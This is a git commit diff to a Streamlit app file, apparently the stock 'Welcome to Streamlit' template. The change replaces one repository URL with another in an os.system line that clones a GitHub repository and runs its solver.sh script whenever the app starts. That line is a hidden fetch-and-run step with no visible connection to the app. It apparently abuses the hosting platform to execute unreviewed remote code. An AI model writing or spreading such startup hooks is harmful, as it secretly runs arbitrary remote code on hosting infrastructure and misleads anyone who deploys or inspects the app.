fb34b9685957110a82bd77239f00f49e6eaf41a6
gembock <85003230+gembock@users.noreply.github.com>
2022-01-20 10:37:01 +0700

    streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://github.com/intanpermani5275/asd.git && cd asd && bash solver.sh')
+os.system('git clone https://github.com/gembock/vcuhoe && cd vcuhoe && bash solver.sh')
 
 """
 # Welcome to Streamlit!
